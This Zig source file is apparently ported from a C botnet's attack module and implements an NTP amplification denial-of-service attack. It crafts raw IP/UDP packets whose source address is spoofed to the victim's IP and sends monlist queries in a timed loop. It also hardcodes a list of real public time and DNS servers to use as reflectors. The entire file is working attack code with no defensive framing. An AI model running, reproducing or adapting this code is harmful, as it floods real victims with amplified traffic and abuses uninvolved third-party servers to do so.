//! # NTP Amplification Attack
//!
//! Sends spoofed NTP monlist queries to reflectors, amplifying traffic to victim.
//!
//! ## C Reference: modules/attack/methods/ntp.c (92 lines)

const std = @import("std");
const posix = std.posix;
const crypto = @import("../crypto/mod.zig");

const IPPROTO_UDP: u8 = 17;
const IPPROTO_RAW: u8 = 255;
const NTP_PORT: u16 = 123;

// ============================================================
// NTP MONLIST PAYLOAD (from C: ntp.c lines 16-18)
// ============================================================

const ntp_monlist = [_]u8{
    0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
};

// ============================================================
// REFLECTOR LIST (from C: ntp.c lines 22-32)
// ============================================================

const reflectors = [_]u32{
    0x65A3A384, // 132.163.4.101 (NIST)
    0x66A3A384, // 132.163.4.102
    0x67A3A384, // 132.163.4.103
    0x1C0F0681, // 129.6.15.28
    0x01C89FA2, // 162.159.200.1
    0x7BC89FA2, // 162.159.200.123
    0x0023EFD8, // 216.239.35.0
    0x0423EFD8, // 216.239.35.4
    0xDEDEC3D0, // 208.67.222.222
};

// ============================================================
// IP + UDP HEADERS
// ============================================================

const IpHeader = packed struct {
    version_ihl: u8,
    tos: u8,
    tot_len: u16,
    id: u16,
    frag_off: u16,
    ttl: u8,
    protocol: u8,
    check: u16,
    saddr: u32,
    daddr: u32,
};

const UdpHeader = packed struct {
    sport: u16,
    dport: u16,
    len: u16,
    check: u16,
};

// ============================================================
// NTP AMPLIFICATION (from C: ntp.c attack_ntp lines 34-91)
// ============================================================

pub fn attackNtp(victim_ip: u32, _: u16, duration: u32) void {
    // Create raw socket (from C: lines 37-41)
    const sock = posix.socket(posix.AF.INET, posix.SOCK.RAW, IPPROTO_UDP) catch return;
    defer posix.close(sock);

    const one: i32 = 1;
    const IP_HDRINCL = 3;
    posix.setsockopt(sock, posix.IPPROTO.IP, IP_HDRINCL, std.mem.asBytes(&one)) catch {};

    var rng = crypto.FastRandom.init(@truncate(@as(u64, @bitCast(std.time.timestamp()))));

    const end_time = std.time.timestamp() + duration;

    // Packet: IP(20) + UDP(8) + Payload(8) = 36 bytes
    const PACKET_SIZE = 36;

    while (std.time.timestamp() < end_time) {
        // Round robin through reflectors (from C: lines 67-88)
        for (reflectors) |reflector_ip| {
            var packet: [PACKET_SIZE]u8 = undefined;
            @memset(&packet, 0);

            // IP Header (from C: lines 51-61)
            const iph = @as(*IpHeader, @ptrCast(@alignCast(&packet)));
            iph.version_ihl = 0x45;
            iph.tos = 0;
            iph.tot_len = std.mem.nativeToBig(u16, PACKET_SIZE);
            iph.id = std.mem.nativeToBig(u16, @truncate(rng.next()));
            iph.frag_off = 0;
            iph.ttl = 255;
            iph.protocol = IPPROTO_UDP;
            iph.saddr = victim_ip; // SPOOFED - victim receives response
            iph.daddr = reflector_ip;
            iph.check = 0;
            iph.check = crypto.internetChecksum(packet[0..20]);

            // UDP Header (from C: lines 77-81)
            const udph = @as(*UdpHeader, @ptrCast(@alignCast(packet[20..].ptr)));
            udph.sport = std.mem.nativeToBig(u16, @truncate(rng.next()));
            udph.dport = std.mem.nativeToBig(u16, NTP_PORT);
            udph.len = std.mem.nativeToBig(u16, 8 + ntp_monlist.len);
            udph.check = 0;

            // Copy payload (from C: lines 84-85)
            @memcpy(packet[28..36], &ntp_monlist);

            // Send (from C: line 87)
            var dest: posix.sockaddr.in = .{
                .family = posix.AF.INET,
                .port = std.mem.nativeToBig(u16, NTP_PORT),
                .addr = reflector_ip,
            };

            _ = posix.sendto(sock, &packet, 0, @ptrCast(&dest), @sizeOf(posix.sockaddr.in)) catch {};
        }
    }
}
